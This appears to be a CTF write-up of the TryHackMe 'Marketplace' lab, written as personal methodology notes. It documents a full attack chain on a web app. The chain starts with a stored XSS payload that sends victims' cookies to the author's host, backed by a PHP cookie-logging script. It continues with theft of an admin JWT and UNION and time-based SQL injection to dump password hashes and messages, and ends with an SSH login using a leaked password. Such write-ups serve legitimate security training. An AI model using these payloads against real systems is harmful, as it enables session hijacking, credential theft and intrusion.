<http://10.10.208.90/item/1>
![unnamed_0031f48e5da040ed81d1107f8f0ccf92](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011506.png)

BOTH PARAMATERS IN LISTING FORM IS VULNERABLE TO XSS 
<http://10.10.208.90:32768/new>
```
<script>alert('uwu');</script>
```

```
<http://10.10.208.90:32768/new>

<script>document.location='<http://10.13.31.108/grabber.php?cmd='+document.cookie></script>
```

gedit grabber.php

```
<?php
$cookie = $_REQUEST['cmd'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

![unnamed_544cb2bd48a24543908f29176f7c519b](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011506-1.png)

And we get the token!
but this is only our token. This doesn't help us
![unnamed_9583e341c5f441c9bcb785288852c246](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011506-2.png)
However when I report it to admin, we get a JWT back 
![unnamed_38c5764ab5fb42dfb9fc8d5d5893d037](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507.png)

This time, the correct one :)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjUwMTI1NzR9.bKWPWlxIiMajLlO93q7tJ1_hdlBnK9-mtapkNr6C6w0
```

<https://jwt.io/>
Payload data:
```
{
  "userId": 2,
  "username": "michael",
  "admin": true,
  "iat": 1665012574
}

```
![unnamed_23ae085f9fc0434193903a77316751a0](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-1.png)
As we can see this location gives us a 403, which means we don't have access with our current privileges

However, we managed to steal the admins token, so let's see if we can access now
![unnamed_e0147ef425e54e5595d1efa3766da37c](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-2.png)

Lookie lookie! :)
![unnamed_4d4107a7da1841cea7262df171e660a3](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-3.png)

So currently we are michael
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjUwMTI1NzR9.bKWPWlxIiMajLlO93q7tJ1_hdlBnK9-mtapkNr6C6w0
```

NEXT WE FIND AN SQLI
<http://10.10.208.90:32768/admin?user=2%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL-->

So we know there are 6 columns
<http://10.10.208.90:32768/admin?user=2%20or%20sleep(5)-->
Makes the application sleep for 5 seconds
```
?user=-3 UNION SELECT NULL, @@version, NULL, NULL--
```
![unnamed_3eab26391bd248bea53c17a84b363d00](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-4.png)

```
?user=-3 union select NULL, group_concat(SCHEMA_NAME), NULL, NULL from INFORMATION_SCHEMA.schemata--
```
![unnamed_bb42259c91f84b50bd1d351df465757f](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-5.png)

```
?user=-3 union select NULL, group_concat(table_name), NULL, NULL from INFORMATION_SCHEMA.tables where table_schema='marketplace'--```
```
![unnamed_ea625274497543f5b5f91cf5f1de5055](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-6.png)
```?user=-3 union select NULL, group_concat(table_name, ':', column_name), NULL, NULL from INFORMATION_SCHEMA.columns where table_schema='marketplace'--```
![unnamed_c1a5d5481e464c62b4309e57c4bdc43a](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-7.png)

```
?user=-3 union select NULL, group_concat(password), NULL, NULL from marketplace.users--
```
![unnamed_570b856411c64bea89dfb346174d11be](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-8.png)
I tried cracking these hashes, but that doesn't seem to be the way the creator wants it to happen so

```?user=-12313122 UNION SELECT NULL, GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='messages'--```
![unnamed_549452a867c94c1eb93426f205a55a06](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-9.png)
```
?user=-3 union select NULL, group_concat(user_from, 'UWU', user_to, 'UWU', message_content), NULL, NULL from marketplace.messages--
```
![unnamed_a50782b512b14846b6af1207c257260b](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-10.png)

```
User ID 1 password:
@b_ENXkGYUCAv3zJ

ssh jake@10.10.208.90
@b_ENXkGYUCAv3zJ
```
![unnamed_f1a25b50779a477c9551ed526323fdd2](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/PORT%2080/PORT%2080/{{notename}}-202605011507-11.png)